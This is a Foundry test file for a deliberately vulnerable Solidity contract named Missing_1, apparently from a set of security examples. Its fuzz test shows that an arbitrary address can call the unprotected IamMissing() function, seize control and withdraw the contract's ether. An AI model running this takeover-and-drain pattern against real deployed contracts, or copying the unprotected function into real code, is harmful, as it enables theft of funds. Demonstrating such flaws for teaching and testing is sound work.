
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {
    Missing_1 public _contractUnderTest;
    address initialOwner;

    function setUp() public {
        initialOwner = makeAddr("initialOwner");
        _contractUnderTest = new Missing_1();
        vm.prank(initialOwner);
        _contractUnderTest.IamMissing();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != initialOwner);

        vm.deal(address(_contractUnderTest), 1 ether);

        vm.prank(caller);
        _contractUnderTest.IamMissing();

        uint256 balanceBefore = caller.balance;
        vm.prank(caller);
        _contractUnderTest.withdraw();
        assertEq(caller.balance, balanceBefore + 1 ether);
    }
}
